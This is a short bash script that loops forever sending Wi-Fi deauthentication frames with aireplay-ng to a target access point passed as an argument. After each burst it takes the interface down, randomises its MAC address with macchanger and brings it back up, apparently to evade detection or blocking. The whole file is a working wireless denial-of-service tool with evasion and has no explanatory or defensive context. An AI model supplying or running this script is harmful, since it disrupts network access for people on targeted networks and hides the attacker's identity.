#!/bin/bash

while true
	do
		aireplay-ng -0 1 -b $1 $2 | grep "DeAuth"
		ifconfig $2 down
		macchanger -r $2 | grep "New MAC"
		ifconfig $2 up
		sleep 4
	done
